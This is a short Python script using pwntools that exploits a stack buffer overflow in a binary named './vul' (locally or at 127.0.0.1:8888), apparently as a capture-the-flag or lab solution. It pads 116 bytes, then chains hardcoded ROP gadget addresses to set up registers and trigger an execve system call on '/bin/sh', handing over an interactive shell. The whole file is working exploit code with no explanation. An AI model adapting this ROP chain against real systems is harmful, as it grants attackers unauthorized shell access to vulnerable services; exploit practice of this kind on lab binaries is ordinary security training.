#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
# raw_input('pause')
pop_eax_ret_addr = 0x080b8c36
pop_edx_ecx_ebx_ret_addr = 0x08070050
int_0x80_addr = 0x0806dc37
bin_sh_addr = 0x080bbdb0
# payload = cyclic(500)
offset = 116
payload1 = (
	'A' * offset + # buf
	p32(pop_eax_ret_addr) + # pop eax; ret
	p32(11) + # eax = 11
	p32(pop_edx_ecx_ebx_ret_addr) + # pop edx; pop ecx; pop ebx; ret
	p32(0) + # edx = 0
	p32(0) + # ecx = 0
	p32(bin_sh_addr) + # ebx = '/bin/sh'
	p32(int_0x80_addr) # int 0x80
)
p.sendline(payload1)
p.interactive()
